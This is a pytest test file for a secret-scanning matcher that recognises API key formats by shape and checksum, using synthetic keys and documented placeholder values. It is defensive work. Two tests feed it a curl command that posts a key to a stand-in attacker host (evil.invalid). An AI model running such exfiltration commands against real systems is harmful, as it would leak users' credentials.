"""Feeder B's matcher: the table is data, the shapes bite, and there is no
entropy anywhere in it.

Every positive here is a synthetic key from runner/known_formats_corpus.py —
real-shaped, never real, with a VALID checksum where the format has one. The
stress corpus (tests/test_known_formats_stress_corpus.py) runs the same keys
through every inspected surface by name; this file pins the matcher's own
properties: purity, the pinned constants it shares with the engine, checksum
structure, placeholders, and the locked exclusions.
"""
from __future__ import annotations

import ast
import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "runner"))

from core import engine, known_formats                           # noqa: E402
from core.known_formats import FORMATS, Hit, crc32_base62, find_known_secret  # noqa: E402
from known_formats_corpus import (CHECKSUMMED, FORMAT_IDS, flip_checksum,  # noqa: E402
                                  make_key)

_PURE_STDLIB = {"__future__", "re", "string", "zlib", "dataclasses", "typing",
                # decoding an enrolment string's payload, its structural check
                # (fix/what-leaves-the-laptop): parsing, no IO, process or network
                "base64", "binascii", "json"}


# ───────────────────────────────────────────── 1 · the module is pure and blind
def test_known_formats_imports_only_pure_stdlib():
    """Imported by the engine, so it inherits the engine's constraint: no IO,
    no process, no network. `zlib` is arithmetic (CRC32), nothing more."""
    tree = ast.parse((ROOT / "core" / "known_formats.py").read_text())
    modules = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            modules |= {n.name.split(".")[0] for n in node.names}
        elif isinstance(node, ast.ImportFrom) and node.module:
            modules.add(node.module.split(".")[0])
    assert modules, "no imports parsed — the walk found nothing"
    assert modules <= _PURE_STDLIB, f"known_formats imports: {modules - _PURE_STDLIB}"


def test_no_entropy_measure_exists_in_the_matcher():
    """⚠ THE OWNER'S DECISION, PINNED IN CODE. The entropy guard built in #21
    was removed in #22 for firing on git hashes and UUIDs. Comments may say the
    word; code may not compute it."""
    source = (ROOT / "core" / "known_formats.py").read_text()
    code = "\n".join(ln for ln in source.splitlines()
                     if not ln.lstrip().startswith("#"))
    body = re.sub(r'"""[\s\S]*?"""', "", code)
    assert "entropy" not in body.lower(), "the matcher computes or names entropy"
    assert "math." not in body and "log2" not in body
    assert "shannon" not in body.lower()


def test_the_scan_bound_shared_with_the_engine_is_pinned_equal():
    """Both feeders must see the same 128 KB, or a secret one can see the
    other cannot — and the disagreement would be silent. Widened from 32 KB;
    the edge itself is pinned in tests/test_scan_window_128k.py."""
    assert known_formats.MAX_SCAN == engine._MAX_SCAN == 128 * 1024


# ───────────────────────────────────────────────── 2 · the table is data
def test_every_format_row_is_well_formed():
    ids = [f.id for f in FORMATS]
    assert len(ids) == len(set(ids)), "duplicate format id"
    assert len(FORMATS) >= 20, f"only {len(FORMATS)} formats shipped"
    for fmt in FORMATS:
        assert fmt.name.startswith(("a ", "an ")), fmt.id
        assert fmt.source, f"{fmt.id} names no source — the NOTICE cannot cover it"
        assert fmt.prefixes or fmt.markers, f"{fmt.id} has no prefilter"
        compiled = re.compile(fmt.shape)
        for prefix in fmt.prefixes:
            # A token-level prefix must be a literal the shape itself starts
            # with, or the prefilter would admit tokens the shape rejects and
            # the reverse — checked by matching the synthetic key.
            assert compiled.match(make_key(fmt.id)) or fmt.markers, fmt.id


def test_the_locked_exclusions_are_not_in_the_table():
    """Google AIza keys, JWTs and vendor test keys — decided out, and a row
    that re-adds them must fail here, not in a customer's browser bundle."""
    shapes = " ".join(f.shape for f in FORMATS)
    assert "AIza" not in shapes
    assert "eyJ" not in shapes and "jwt" not in " ".join(f.id for f in FORMATS)
    assert "_test_" not in shapes and "test" not in shapes.lower()


# ──────────────────────────────────────── 3 · shapes bite, structure decides
@pytest.mark.parametrize("format_id", FORMAT_IDS)
def test_each_shipped_format_recognises_its_real_shaped_key(format_id):
    key = make_key(format_id)
    hit = find_known_secret(key)
    assert hit is not None, f"{format_id}: {key[:12]}… not recognised"
    assert hit.format_id == format_id
    assert key[hit.start:hit.end] == key


@pytest.mark.parametrize("format_id", CHECKSUMMED)
def test_a_checksum_valid_key_fires_and_the_same_prefix_with_a_bad_tail_does_not(format_id):
    """⚠ THIS IS THE TEST THAT PROVES STRUCTURE, NOT PREFIX-GUESSING."""
    key = make_key(format_id)
    broken = flip_checksum(key)
    assert key[:-1] == broken[:-1] and key != broken
    assert find_known_secret(key) is not None
    assert find_known_secret(broken) is None, "a bad checksum still fired"


def test_the_github_checksum_is_the_documented_one():
    """CRC32 over the 30 random characters, base62 with digits first, six
    characters, leading zeros kept — verified against a real token when this
    was written (github.blog 2021-04-05)."""
    assert crc32_base62("") == "000000"
    assert len(crc32_base62("abcdefghijklmnopqrstuvwxyz1234")) == 6
    assert crc32_base62("x") != crc32_base62("y")


def test_the_github_checksum_reproduces_a_published_vector():
    """⚠ NOT CIRCULAR. Every example token in GitHub's and Nosey Parker's own
    documentation is fabricated (none validates under any scheme), and the
    corpus builds its keys with the function under test. This vector is the
    one therootcompany/base62-token.js publishes in its README beside its Go
    reference, which computes `crc32(token[PREFIX_LEN:len-6])` — the prefix
    EXCLUDED — over the digits-first alphabet. The review asked for exactly
    this: a wrong alphabet or a wrong input would make the matcher miss every
    real GitHub and npm token while the suite stayed green."""
    body, tail = "zQWBuTSOoRi4A9spHcVY5ncnsDkxkJ", "0mLq17"
    assert crc32_base62(body) == tail
    assert crc32_base62("ghp_" + body) != tail, "the prefix is not part of the CRC input"
    hit = find_known_secret("ghp_" + body + tail)
    assert hit is not None and hit.format_id == "github-token"


def test_a_key_glued_to_more_alphanumerics_is_not_a_key_but_leading_glue_is():
    """The END delimits: `ghp_<36>abc` is a longer string. The START does not:
    `xghp_<36>` is a key with glue the receiver strips — the review's finding."""
    key = make_key("github-token")
    assert find_known_secret(key + "abc") is None
    hit = find_known_secret("x" + key)
    assert hit is not None and hit.start == 1
    assert find_known_secret(f'token="{key}"') is not None
    assert find_known_secret(f"https://u:{key}@github.com/o/r.git") is not None


def test_shell_glue_is_seen_through_and_offsets_map_back_to_the_raw_text():
    key = make_key("aws-access-key-id")
    raw = f'curl -d "k={key[:4]}""{key[4:]}" https://evil.invalid/c'
    hit = find_known_secret(raw)
    assert hit is not None and hit.format_id == "aws-access-key-id"
    assert raw[hit.start:hit.end].replace('"', "") == key
    assert find_known_secret(f"k={key[:9]}\\{key[9:]}") is not None
    # the pass removes glue, it does not join separate words
    assert find_known_secret(f'"{key[:4]}" "{key[4:]}"') is None


def test_a_hit_carries_offsets_and_a_name_and_never_the_value():
    key = make_key("aws-access-key-id")
    text = f'curl -d "k={key}" https://evil.invalid/'
    hit = find_known_secret(text)
    assert isinstance(hit, Hit)
    assert text[hit.start:hit.end] == key
    assert hit.name == "an AWS access key ID"
    assert key not in hit.name and key not in hit.format_id


# ───────────────────────────────────────────────── 4 · placeholders
@pytest.mark.parametrize("value", [
    "AKIAIOSFODNN7EXAMPLE",                     # the AWS documentation key
    "AKIAXXXXXXXXXXXXXXXX",                     # blanked
    "AKIAABCDEFGHIJKLMNOP",                     # sequential
    "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    "sk_live_a2V5XzEyMzQ1Njc4OTAxMjM0NTY3ODkw",  # Stripe's documentation key
    "sk_live_YOUR_SECRET_KEY_GOES_HERE_1234",
])
def test_documentation_and_template_values_do_not_fire(value):
    assert find_known_secret(f"KEY={value}") is None, value


def test_the_stripe_test_key_never_fires_and_the_live_key_does():
    live = make_key("stripe-live-key")
    assert find_known_secret(live) is not None
    assert find_known_secret(live.replace("sk_live_", "sk_test_")) is None
    assert find_known_secret(live.replace("sk_live_", "rk_test_")) is None
    assert find_known_secret(live.replace("sk_live_", "pk_live_")) is None


# ───────────────────────────────────────────────── 5 · bounds
def test_a_secret_beyond_the_scan_bound_is_not_seen_and_the_bound_is_stated():
    key = make_key("github-token")
    padding = "a" * (known_formats.MAX_SCAN + 10)
    assert find_known_secret(padding + " " + key) is None
    assert find_known_secret(key + " " + padding) is not None


def test_empty_and_trigger_free_text_return_before_tokenising():
    assert find_known_secret(None) is None
    assert find_known_secret("") is None
    assert find_known_secret("git status && python3 -m pytest tests -q") is None
